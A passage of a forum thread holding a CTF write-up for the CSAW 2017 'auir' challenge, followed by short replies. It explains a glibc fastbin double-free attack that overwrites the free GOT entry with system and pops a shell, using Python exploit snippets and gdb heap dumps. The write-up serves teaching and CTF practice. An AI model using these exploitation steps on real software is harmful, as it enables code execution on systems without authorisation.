(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c10 --&gt; 0x617c80 --&gt; 0x0
(0x80)     fastbin[6]: 0x0

</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] free(2)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
</code></pre>
<hr>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2 [free]
0x617c20:	0x0000000000617c80	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3 [free]
0x617c90:	0x0000000000000000	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4 [in use]
0x617d00:	0x4545454545454545	0x00000000000a4545
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk

</code></pre>
<p>To understand the above drawing, just keep in mind the following:</p>
<hr>
<h2><em>There are 10 fast bins. Each of these bins maintains a single linked list. Addition and deletion happen from the front of this list (LIFO).</em></h2>
<p>In our scenario we have 2 free‚Äôd chunks. Once we request a chunk of size <code>0x70</code>, <code>malloc</code> will do the following:</p>
<ul>
<li>
<p>Delete the <strong>head</strong> fastbin chunk of the list and give it back to the user.</p>
</li>
<li>
<p>For the next allocation, place at the <strong>head</strong> of the list the address of the chunk which was found in the previous chunk‚Äôs forward pointer field of the chunk that was given back to the user (don‚Äôt worry if it sounds complicated, there‚Äôll be more ascii-arts soon).</p>
</li>
</ul>
<p>The 2nd bullet point is the bread and butter of the fastbin attack. What if we were able to overwrite the forward pointer of a fastbin chunk while it‚Äôs still in its free list with an address of our choice? That essentially means we would get back an arbitrary pointer where we can write whatever we want. Here‚Äôs our write primitive! But no so easy folks, there are 2 requirements we need to take care of first.</p>
<p>First of all, how can we overwrite the forward pointer if there‚Äôs no overflow? Well well, we can abuse the UAF in order to <code>free</code> a chunk twice in a certain order. What do I mean by the order?</p>
<pre><code class="lang-auto">if (__builtin_expect (old == p, 0)) {
    errstr = "double free or corruption (fasttop)";
    goto errout;
}
</code></pre>
<p>The above code checks if the chunk that is about get free‚Äôd is the one that is currently at the top / head of the fastbin list. In other words, we can‚Äôt <code>free</code> the same chunk twice in a row. But that‚Äôs not secure enough! Bypassing this is a piece of cake. All we have to do is <code>free</code> a different chunk in between the double free. Let‚Äôs reconstruct the exploit and enter visual mode.</p>
<pre><code class="lang-python"># double-free =&gt; fastbin attack
free(3)
free(2)
free(3)
</code></pre>
<p>We had already analyzed the first 2 <code>free</code>s so let‚Äôs continue with the 3rd one.</p>
<pre><code class="lang-python">free(3)
</code></pre>
<pre><code class="lang-makefile">(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --&gt; 0x617c10 --&gt; 0x617c80
(0x80)     fastbin[6]: 0x0
</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] free(3)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
</code></pre>
<hr>
<pre><code class="lang-makefile">0x617c10:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 2 [free]
0x617c20:	0x0000000000617c80	0x00007ffff70a4343
0x617c30:	0x0000000000000000	0x0000000000000000
0x617c40:	0x0000000000000000	0x0000000000000000
0x617c50:	0x0000000000000000	0x0000000000000000
0x617c60:	0x0000000000000000	0x0000000000000000
0x617c70:	0x0000000000000000	0x0000000000000000
0x617c80:	0x0000000000000000	0x0000000000000071 &lt;-- chunk 3 [free]
0x617c90:	0x0000000000617c10	0x00000000000a4444
0x617ca0:	0x0000000000000090	0x0000000000000090
0x617cb0:	0x4242424242424242	0x00000000000a4242
0x617cc0:	0x0000000000000000	0x0000000000000000
0x617cd0:	0x0000000000000000	0x0000000000000000
0x617ce0:	0x0000000000000000	0x0000000000000000
0x617cf0:	0x0000000000000000	0x0000000000000091 &lt;-- chunk 4 [in use]
0x617d00:	0x4545454545454545	0x00000000000a4545 
0x617d10:	0x0000000000000000	0x0000000000000000
0x617d20:	0x0000000000000000	0x0000000000000000
0x617d30:	0x0000000000000000	0x00000000000202d1 &lt;-- top chunk
</code></pre>
<p>Do you see what I see? We placed the same chunk <strong>twice</strong> in its corresponding free list! Now ask yourselves, what‚Äôs going to happen once we request a chunk of size <code>0x70</code>? You already know it by now, <code>malloc</code> will check the <strong>head</strong> of the free list and serve back the chunk. However, because of the way we have constructed the free list thanks to the double-free bug, we get to affect <code>0x617c80</code>'s FD pointer while it‚Äôs free! Let‚Äôs see it in action.</p>
<pre><code class="lang-python">alloc(0x68, p64(bss))
</code></pre>
<pre><code class="lang-makefile">(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c10 --&gt; 0x617c80 --&gt; 0x6052ed 
(0x80)     fastbin[6]: 0x0
</code></pre>
<hr>
<p>Let me remind you of the structure of a fastbin chunk and then just pause and ponder.</p>
<pre><code class="lang-makefile">Fastbin Chunk Structure

    chunk-&gt; +-------------------------------------------+
            |    Size of previous chunk if it's free    |
            +-------------------------------------------+
            |             Size of chunk                 |
      mem-&gt; +-------------------------------------------+
            |    Forward pointer to next chunk in list  |
            +-------------------------------------------+
            |                   ...                     |
            +-------------------------------------------+
</code></pre>
<p>In general, whenever we request a chunk, <code>malloc</code> will serve back a pointer to where <code>mem</code> is pointing to in the ascii-art. Regarding the exploit now, we requested a chunk of size <code>0x68</code> (which wraps around <code>0x70</code> for alignment purposes) and we effectively got access to <code>0x617c80</code> which happens to remain in the free list as well. As it can be seen below, we overwrote the <code>FD</code> field with an address of our choice.</p>
<pre><code class="lang-makefile">0x617c80:	0x0000000000000000	0x0000000000000071 &lt;--  chunk 3 [free &amp; in use]
0x617c90:	0x00000000006052ed &lt;-- FD pointer
</code></pre>
<p>Here‚Äôs a view of the fastbin list as well:</p>
<hr>
<pre><code class="lang-makefile">fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
</code></pre>
<hr>
<p>The question now is why did we overwrite the <code>FD</code> field with <code>0x6052ed</code>? We somehow need to get our arbitrary (almost) primitive, don‚Äôt we?</p>
<p><code>malloc</code> does the following check before it deletes a free fastbin chunk in order to serve it back to the user:</p>
<pre><code class="lang-auto">if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
{
    errstr = "malloc(): memory corruption (fast)";
errout:
    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
    return NULL;
}
</code></pre>
<p><code>malloc</code> makes sure there hasn‚Äôt been any sort of fastbin corruption by checking if the size of the chunk which is about to be deleted corresponds to the size of this fastbin request (max <code>0x80</code>) . How do we bypass that? There are a few ways to get around it but here‚Äôs my thought process:</p>
<ul>
<li>
<p>The binary has partial RELRO, which means the Global Offset Table is still writable.</p>
</li>
<li>
<p>If the binary had full RELRO, we can still get around it by overwriting the <code>__malloc_hook</code> function pointer in libc (which is the subject of a future post).</p>
</li>
<li>
<p>So how we overwrite an entry in GOT? The binary keeps track of the allocated objects in a global array of pointers. If we could somehow overwrite one of those pointers with a GOT address and then call the <code>edit</code> function, we can overwrite its content with a function of our taste, such as <code>system</code>!</p>
</li>
</ul>
<p>Let‚Äôs inspect the memory around that global array which is at address <code>0x605310</code>.</p>
<pre><code class="lang-makefile">gef‚û§  x/6gx 0x605310
0x605310:	0x0000000000617c20	0x0000000000617cb0
0x605320:	0x0000000000617c20	0x0000000000617c90
0x605330:	0x0000000000617d00	0x0000000000617c90
</code></pre>
<p>The entries are looking good. Now what if there‚Äôs an address <strong>before</strong> the global array‚Äôs address where at offset <code>+0x8</code> there is a value of a legitimate fastbin size. After a bit of trial and error, here‚Äôs our savior!</p>
<pre><code class="lang-makefile">gef‚û§  x/40gx 0x6052ed
0x6052ed:   0xfff753162000007f	0x000000000000007f
0x6052fd:	0x0000000000000000	0x0000000000000000
0x60530d:	0x0000617c20000000	0x0000617cb0000000
0x60531d:	0x0000617c20000000	0x0000617c90000000
0x60532d:	0x0000617d00000000	0x0000617c90000000
</code></pre>
<p>Who would‚Äôve thought, now we‚Äôre talking! <code>0x6052ed</code> is right below <code>0x605310</code>, <code>0x23</code> below to be precise, which is enough to overflow the entire array since our allocation was of size <code>0x70</code>! And the best part, at offset <code>+0x8</code> there is <code>0x7f</code>, which is a legitimate fastbin chunk size! You might noticed that the address entries are misaligned, but that doesn‚Äôt bother us, we will make sure to surgically overflow the entries such that one of them points to a GOT entry! Game over!</p>
<p>Let‚Äôs keep stepping through the exploit and see the magic happen.</p>
<pre><code class="lang-python">alloc(0x68, "F")
</code></pre>
<pre><code class="lang-makefile">gef‚û§ printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --&gt; 0x6052ed
(0x80)     fastbin[6]: 0x0

</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
</code></pre>
<hr>
<pre><code class="lang-python">alloc(0x68, "G")
</code></pre>
<pre><code class="lang-makefile">gef‚û§  printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x6052ed 
(0x80)     fastbin[6]: 0x0
</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
</code></pre>
<hr>
<p>Off to the last part, on the next allocation we‚Äôll get back <code>0x6052ed</code> and we‚Äôll overflow the 1st and 2nd entry of the global array to point to <code>free</code>'s GOT entry and <code>sh</code>'s address respectively.</p>
<pre><code class="lang-python">alloc(0x68,"H"*0x13 + p64(free_got) + p64(binsh))
</code></pre>
<pre><code class="lang-makefile">gef‚û§  printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
</code></pre>
<pre><code class="lang-makefile">gef‚û§  x/5gx 0x605310
0x605310:	0x0000000000605060	0x00007ffff72f8d17
0x605320:	0x0000000000617c0a	0x0000000000617c90
0x605330:	0x0000000000617d00

gef‚û§  x/gx 0x0000000000605060
0x605060:	0x00007ffff71f04f0

gef‚û§  x 0x00007ffff71f04f0
0x7ffff71f04f0 &lt;__GI___libc_free&gt;:	0x8348535554415541

gef‚û§  x/s 0x00007ffff72f8d17
0x7ffff72f8d17:	"/bin/sh"
</code></pre>
<hr>
<pre><code class="lang-makefile">fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                        
</code></pre>
<p>Brilliant! Let‚Äôs pwn this binary once and for all.</p>
<hr>
<p>###<em>Pwning Time</em></p>
<ul>
<li>
<p>The <code>edit</code> function receives an index as input and then picks the corresponding entry from the global array in order to overwrite its content with our desired input. I picked <code>free</code> as the victim GOT entry because it receives one argument, like <code>system</code>.</p>
</li>
<li>
<p>When we‚Äôre asked to de-allocate a chunk, we provide an index once again and <code>free</code> will be called (or would be called since we‚Äôll overwrite it <code>system</code>'s address) with an address from the global array as an argument.</p>
</li>
<li>
<p>Since we overwrote the 1st entry with <code>system</code>'s address and the 2nd one with <code>sh</code>'s address, once de-allocation takes place and we provide <code>1</code> as the index (arrays are indexed from 0), <code>system</code> will take over control and execute whatever command is at the address which was found in the global array. There‚Äôs our shell!</p>
</li>
</ul>
<pre><code class="lang-python"># free =&gt; system
edit(0, 8, p64(system))
</code></pre>
<pre><code class="lang-makefile">gef‚û§  x/gx 0x0000000000605060
0x605060:	0x00007ffff71b1390
gef‚û§  x 0x00007ffff71b1390
0x7ffff71b1390 &lt;__libc_system&gt;:	0xfa86e90b74ff8548
</code></pre>
<p>Voila! <code>free</code>'s GOT entry officially points to <code>system</code>'s address! Let‚Äôs bring this flag home!</p>
<pre><code class="lang-python"># call system with the 2nd entry as argument, which is binsh
free(1)
</code></pre>
<pre><code class="lang-makefile">[*] Leak:        0x7fa077b3fb78
[*] Libc:        0x7fa07777b000
[*] system:      0x7fa0777c0390
[*] Switching to interactive mode
[*] BREAKING....
$ id
uid=1000(auir) gid=1000(auir) groups=1000(auir)
$ ls
auir
flag
$ cat flag
flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}
</code></pre>
<p>###<em>Conclusion</em></p>
<p>That‚Äôs been it folks! I hope you learnt something new out of it. Thank you for taking the time to read my write-up and if you have any question feel free to comment it down below or reach out to me via twitter DM / IRC.</p>
<p>You can find the full exploit with its PoC on my <a href="../../../external.html?link=https://github.com/sk4px/heapwn/blob/master/csaw2017/auir.py" rel="nofollow noopener">repo</a>.</p>
<p>~ Peace!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="23" />
              <span class='post-likes'>23 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/oaktree.html'><span itemprop='name'>oaktree</span></a>
                (oaktree)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-09-18T14:45:46Z' class='post-time'>
                    September 18, 2017,  2:45pm
                  </time>
                  <meta itemprop='dateModified' content='2017-09-18T14:45:46Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Working my way through this:</p>
<p>First comment: C++ code that uses <code>malloc</code> and <code>free</code>? This is how you know the author went to college!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/_py.html'><span itemprop='name'>_py</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-09-18T14:48:42Z' class='post-time'>
                    September 18, 2017,  2:48pm
                  </time>
                  <meta itemprop='dateModified' content='2017-09-18T14:48:42Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Keep in mind they are called ‚Äúpwnables‚Äù for a reason <img src="../../../0x00sec.org/images/emoji/twitter/winkc164.html?v=9" title=":wink:" class="emoji" alt=":wink:"> <code>malloc</code> and <code>free</code> were purposely used because their internals are more known and thus kinda ‚Äúeasier‚Äù to exploit.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-09-18T18:13:35Z' class='post-time'>
                    September 18, 2017,  6:13pm
                  </time>
                  <meta itemprop='dateModified' content='2017-09-18T18:13:35Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <ul>
<li>
<strong>Aye</strong>, awesome article man! <img src="../../../0x00sec.org/images/emoji/twitter/smilec164.html?v=9" title=":smile:" class="emoji" alt=":smile:">
</li>
</ul>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/segfault.html'><span itemprop='name'>segfault</span></a>
                (vladimir)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-09-19T10:58:15Z' class='post-time'>
                    September 19, 2017, 10:58am
                  </time>
                  <meta itemprop='dateModified' content='2017-09-19T10:58:15Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>awesome mate , thanks !</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/oaktree.html'><span itemprop='name'>oaktree</span></a>
                (oaktree)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-09-19T13:35:11Z' class='post-time'>
                    September 19, 2017,  1:35pm
                  </time>
                  <meta itemprop='dateModified' content='2017-09-19T13:35:11Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p><a class="mention" href="../../u/segfault.html">@segfault</a> <a class="mention" href="../../u/exploit.html">@exploit</a></p>
<p>Please remember that comments like ‚Äúthank you‚Äù are better-expressed by hitting the Like button. If you want to praise an author more, hop on IRC!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="6" />
              <span class='post-likes'>6 Likes</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/segfault.html'><span itemprop='name'>segfault</span></a>
                (vladimir)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-09-19T14:16:01Z' class='post-time'>
                    September 19, 2017,  2:16pm
                  </time>
                  <meta itemprop='dateModified' content='2017-09-19T14:16:01Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Oooooh Really ? so ‚ÄúThanks‚Äù means nothing ?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="E0EM88E5GHs0XSwz1qZRXmRmK"></script>
  </body>
  
</html>
